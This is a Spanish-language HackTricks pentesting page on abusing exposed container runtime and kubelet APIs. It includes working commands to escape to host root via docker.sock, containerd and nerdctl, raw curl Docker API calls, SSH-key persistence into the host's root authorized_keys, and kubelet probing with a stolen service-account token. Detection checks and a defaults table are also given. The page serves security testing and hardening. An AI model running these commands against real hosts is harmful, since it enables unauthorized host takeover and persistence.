# Exposición de la API de Runtime y del Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Modelos de acceso al Daemon

Muchos compromisos reales de containers no comienzan con un namespace escape. Comienzan con el acceso al plano de control del runtime. Si un workload puede comunicarse con `dockerd`, `containerd`, CRI-O, Podman o kubelet mediante un Unix socket montado o un listener TCP expuesto, el atacante podría solicitar un nuevo container con más privilegios, montar el sistema de archivos del host, unirse a los namespaces del host u obtener información sensible del nodo. En esos casos, la runtime API es el límite de seguridad real, y comprometerla es funcionalmente similar a comprometer el host.

Por eso, la exposición del runtime socket debe documentarse por separado de las protecciones del kernel. Un container con seccomp, capabilities y confinamiento MAC normales todavía puede estar a una sola llamada a la API de comprometer el host si `/var/run/docker.sock` o `/run/containerd/containerd.sock` están montados en su interior. El aislamiento del kernel del container actual puede estar funcionando exactamente según lo diseñado, mientras que el plano de gestión del runtime permanece completamente expuesto.

Docker Engine expone tradicionalmente su API privilegiada a través del Unix socket local en `unix:///var/run/docker.sock`. Históricamente, también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido con TLS en `2376`. Exponer el daemon de forma remota sin TLS sólido y autenticación de clientes convierte efectivamente la Docker API en una interfaz de root remota.

containerd, CRI-O, Podman y kubelet exponen superficies de alto impacto similares. Los nombres y los workflows difieren, pero la lógica no. Si la interfaz permite al caller crear workloads, montar rutas del host, obtener credenciales o modificar containers en ejecución, la interfaz es un canal de gestión privilegiado y debe tratarse como tal.

Las rutas locales habituales que conviene comprobar son:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Las stacks más antiguas o especializadas también pueden exponer endpoints como `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Son menos comunes en entornos modernos, pero, cuando se encuentran, deben tratarse con la misma precaución, ya que representan superficies de control del runtime y no sockets de aplicaciones ordinarios.

## Acceso remoto seguro

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y, preferiblemente, con autenticación mutua para que el daemon verifique al cliente y el cliente verifique al daemon. La antigua práctica de abrir el daemon de Docker mediante HTTP sin cifrar por comodidad es uno de los errores más peligrosos en la administración de contenedores, porque la superficie de la API es lo suficientemente potente como para crear directamente contenedores privilegiados.

El patrón histórico de configuración de Docker tenía este aspecto:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
En hosts basados en systemd, la comunicación con el daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket preabierto de systemd en lugar de enlazarlo directamente. La lección importante no es la sintaxis exacta, sino la consecuencia para la seguridad. En el momento en que el daemon escucha más allá de un socket local con permisos estrictamente definidos, la seguridad del transporte y la autenticación del cliente pasan a ser obligatorias, en lugar de ser medidas de hardening opcionales.

## Abuso

Si hay un runtime socket presente, confirma cuál es, si existe un cliente compatible y si es posible acceder mediante HTTP sin procesar o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Estos comandos son útiles porque distinguen entre una ruta inactiva, un socket montado pero inaccesible y una API privilegiada activa. Si el cliente funciona correctamente, la siguiente pregunta es si la API puede iniciar un contenedor nuevo con un bind mount del host o compartiendo namespaces del host.

### Cuando no hay ningún cliente instalado

La ausencia de `docker`, `podman` u otra CLI amigable no significa que el socket sea seguro. Docker Engine se comunica mediante HTTP a través de su socket Unix, y Podman expone tanto una API compatible con Docker como una API nativa de Libpod mediante `podman system service`. Esto significa que un entorno mínimo con solo `curl` aún puede bastar para controlar el daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Esto importa durante el post-exploitation porque los defensores a veces eliminan los binarios de cliente habituales, pero dejan montado el management socket. En hosts de Podman, recuerda que la ruta de alto valor difiere entre deployments rootful y rootless: `unix:///run/podman/podman.sock` para instancias de servicio rootful y `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para las rootless.

### Del Docker Socket a Host Root

Si se puede acceder a `docker.sock`, el escape clásico consiste en iniciar un nuevo contenedor que monte el sistema de archivos root del host y, a continuación, hacer `chroot` en él:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Esto proporciona ejecución directa como root del host a través del daemon de Docker. El impacto no se limita a la lectura de archivos. Una vez dentro del nuevo container, el atacante puede modificar archivos del host, recolectar credenciales, implantar persistencia o iniciar workloads adicionales con privilegios.

### Ejemplo completo: del socket de Docker a los namespaces del host

Si el atacante prefiere entrar en los namespaces en lugar de obtener acceso únicamente al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este camino llega al host pidiendo al runtime que cree un contenedor nuevo con una exposición explícita de los host namespaces, en lugar de explotar el contenedor actual.

### Patrón de persistencia mediante Docker Socket

El control del runtime también puede utilizarse para la persistencia en lugar de para obtener un shell de un solo uso. El patrón genérico consiste en crear un contenedor auxiliar con un mount del host, escribir material de acceso autorizado o un startup hook en el sistema de archivos montado del host y, después, validar que el host lo consuma.

Forma del ejemplo:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La misma idea puede dirigirse a systemd units, cron fragments, application startup files o SSH keys, según lo que el operator quiera demostrar. El punto importante es que el cambio persistente se realiza mediante la autoridad del runtime daemon sobre el filesystem del host, no mediante privilegios adicionales en el container original.

### Raw Docker API Helper Pivot

Cuando falta Docker CLI, el mismo flujo del helper con host-mount puede ejecutarse mediante HTTP sobre el Unix socket. El flujo genérico es: confirmar la API, crear un helper container con un host bind mount, iniciarlo, crear una instancia de exec e iniciar ese exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La solicitud final `/exec/<id>/start` depende del ID de exec devuelto, pero el aspecto de seguridad es independiente de los detalles exactos de JSON: el acceso directo a la API de un daemon Docker rootful basta para solicitar una carga de trabajo auxiliar con mayores privilegios.

### Ejemplo completo: socket de `containerd`

Un socket de `containerd` montado suele ser igual de peligroso:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si hay disponible un cliente más similar a Docker, `nerdctl` puede resultar más práctico que `ctr` porque expone flags conocidos como `--privileged`, `--pid=host` y `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
El impacto vuelve a ser el compromiso del host. Aunque no haya herramientas específicas de Docker, otra runtime API aún puede ofrecer el mismo poder administrativo. En los nodos de Kubernetes, `crictl` también puede ser suficiente para realizar reconnaissance e interactuar con containers, ya que se comunica directamente con el endpoint de CRI.

### Socket de BuildKit

`buildkitd` puede pasar fácilmente desapercibido porque a menudo se considera "solo el backend de compilación", pero el daemon sigue siendo un plano de control privilegiado. Un `buildkitd.sock` accesible puede permitir a un atacante ejecutar pasos de compilación arbitrarios, inspeccionar las capacidades de los workers, usar contextos locales del entorno comprometido y solicitar entitlements peligrosos como `network.host` o `security.insecure` cuando el daemon se configuró para permitirlos.

Las primeras interacciones útiles son:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si el daemon acepta solicitudes de build, comprueba si hay entitlements inseguros disponibles:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
El impacto exacto depende de la configuración del daemon, pero un servicio de BuildKit rootful con entitlements permisivos no es una simple comodidad inofensiva para desarrolladores. Trátalo como otra superficie administrativa de alto valor, especialmente en CI runners y nodos de build compartidos.

### Kubelet API Over TCP

El kubelet no es un container runtime, pero sigue formando parte del plano de gestión del nodo y a menudo se incluye en el mismo análisis del límite de confianza. Si el puerto seguro `10250` del kubelet es accesible desde el workload, o si se exponen credenciales del nodo, kubeconfigs o permisos de proxy, el atacante podría enumerar Pods, recuperar logs o ejecutar comandos en containers locales del nodo sin pasar nunca por la ruta de admisión del servidor de la Kubernetes API.

Empieza con un descubrimiento sencillo:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si la ruta de proxy del kubelet o del API-server autoriza `exec`, un cliente compatible con WebSocket puede convertirlo en code execution en otros containers del node. Esta es también la razón por la que `nodes/proxy` con permiso únicamente `get` es más peligroso de lo que parece: la solicitud aún puede llegar a endpoints del kubelet que ejecutan comandos, y esas interacciones directas con el kubelet no aparecen en los logs de auditoría normales de Kubernetes.<sup>[[2]](#references)</sup>

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el container puede alcanzar algún management plane que debería haber permanecido fuera del trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Qué resulta interesante aquí:

- Un runtime socket montado suele ser una primitiva administrativa directa, no una simple divulgación de información.
- Un listener TCP en `2375` sin TLS debe tratarse como una condición de compromiso remoto.
- Las variables de entorno como `DOCKER_HOST` suelen revelar que el workload fue diseñado intencionadamente para comunicarse con el runtime del host.

## Valores predeterminados del runtime

| Runtime / platform | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local de forma predeterminada | `dockerd` escucha en el socket local y el daemon normalmente se ejecuta como rootful | montar `/var/run/docker.sock`, exponer `tcp://...:2375`, TLS débil o ausente en `2376` |
| Podman | CLI sin daemon de forma predeterminada | No se requiere un daemon privilegiado de larga duración para el uso local habitual; los API sockets aún pueden exponerse cuando se habilita `podman system service` | exponer `podman.sock`, ejecutar el servicio de forma amplia, uso de una API rootful |
| containerd | Socket local privilegiado | La API administrativa se expone a través del socket local y normalmente la consumen herramientas de nivel superior | montar `containerd.sock`, acceso amplio mediante `ctr` o `nerdctl`, exponer namespaces privilegiados |
| CRI-O | Socket local privilegiado | El endpoint CRI está destinado a componentes locales de confianza del nodo | montar `crio.sock`, exponer el endpoint CRI a workloads no confiables |
| Kubernetes kubelet | API de gestión local del nodo | Kubelet no debería ser ampliamente accesible desde los Pods; el acceso puede exponer el estado de los Pods, credenciales y funciones de ejecución, según la autenticación y autorización | montar sockets o certificados de kubelet, autenticación débil de kubelet, networking del host junto con un endpoint de kubelet accesible |

## Referencias

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
